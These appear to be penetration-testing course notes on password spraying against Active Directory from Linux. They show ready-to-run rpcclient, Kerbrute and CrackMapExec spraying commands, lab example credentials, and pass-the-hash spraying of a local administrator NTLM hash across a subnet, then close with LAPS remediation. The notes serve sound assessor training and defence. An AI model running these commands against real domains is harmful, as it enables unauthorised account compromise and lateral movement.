# Internal Password Spraying – Linux

## 1. Overview

Password spraying involves trying a single password against multiple user accounts to identify valid credentials.

From Linux, common tools include:
- **rpcclient** – Attempts authentication through SMB/RPC.
- **Kerbrute** – Performs password spraying through Kerberos.
- **CrackMapExec** – Tests credentials against SMB services.

**Important:** Check the domain password policy before spraying to avoid account lockouts.

---

## 2. Password Spraying with rpcclient

Use `rpcclient` to attempt authentication against users in a wordlist.

```bash
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <DC_IP> | grep Authority
done
```

- `valid_users.txt` – List of valid usernames.
- `-U` – Specifies the username and password.
- `getusername` – Retrieves the authenticated username information.
- `grep Authority` – Filters output indicating successful authentication.

**Example output:**
```text
Account Name: tjohnson, Authority Name: INLANEFREIGHT
```

In the source example, the presence of `Authority Name` indicates a successful login.

---

## 3. Password Spraying with Kerbrute

Kerbrute can test a password against a list of domain users using Kerberos.

```bash
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt '<PASSWORD>'
```

**Example:**
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt 'Welcome1'
```

**Successful output:**
```text
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
```

A successful result identifies a valid username and password combination.

## 4. Password Spraying with CrackMapExec

CrackMapExec can test a single password against multiple usernames over SMB.

```bash
sudo crackmapexec smb <DC_IP> -u valid_users.txt -p '<PASSWORD>' | grep +
```

- `-u` – Specifies a username or username file.
- `-p` – Specifies the password.
- `grep +` – Filters output for lines containing `+`, which commonly indicates successful authentication.

### Validate Discovered Credentials

```bash
sudo crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>'
```

A successful authentication is indicated by output similar to:

```text
[+] DOMAIN\username:password
```

## 5. Local Administrator Password Reuse

Local administrator password reuse occurs when multiple computers share the same local administrator password or NTLM hash.

This is common in environments where systems are deployed using identical images or shared configurations.

### Important Concepts

- A local administrator password may work on multiple computers.
- An NTLM hash can be used for pass-the-hash authentication when the target and tool support it.
- Password patterns may be reused across desktop and server accounts.
- Similar usernames may have similar or reused passwords.
- High-value systems, such as SQL and Exchange servers, may be important assessment targets.

### Spraying a Local Administrator NTLM Hash

```bash
sudo crackmapexec smb --local-auth <SUBNET> -u administrator -H <NTLM_HASH> | grep +
```

**Options:**

| Option | Purpose |
|---|---|
| `--local-auth` | Authenticates against local accounts rather than domain accounts |
| `-u administrator` | Specifies the local administrator username |
| `-H` | Supplies an NTLM hash |
| `grep +` | Filters output for successful authentication results |

The source example found the same local administrator hash valid on three systems.

**Critical:** `--local-auth` is important when testing local administrator credentials. Without it, authentication may be attempted against the domain, potentially contributing to domain account lockouts.

This technique can generate substantial network activity and may be unsuitable for stealth-focused assessments.

---

## 6. Remediation – LAPS

**Local Administrator Password Solution (LAPS)** helps manage local administrator passwords through Active Directory.

Its primary security benefit is reducing password reuse by managing unique local administrator passwords across computers.

### Benefits
- Unique local administrator passwords per managed computer.
- Centralized password management.
- Automatic password rotation according to policy.
- Reduced risk from compromised local administrator credentials.

| Tool / Concept | Key Point |
|---|---|
| `rpcclient` | SMB/RPC authentication testing |
| `kerbrute passwordspray` | Password spraying through Kerberos |

### Key Takeaways

1. Linux password spraying can be performed using rpcclient, Kerbrute, or CrackMapExec.
2. Validate any discovered credentials before using them for further enumeration.
3. Local administrator credentials may be reused across multiple hosts.
4. Use `--local-auth` when testing local administrator accounts.
5. Password spraying and hash-based authentication can generate detectable activity.
6. LAPS helps mitigate the risks associated with shared local administrator passwords.
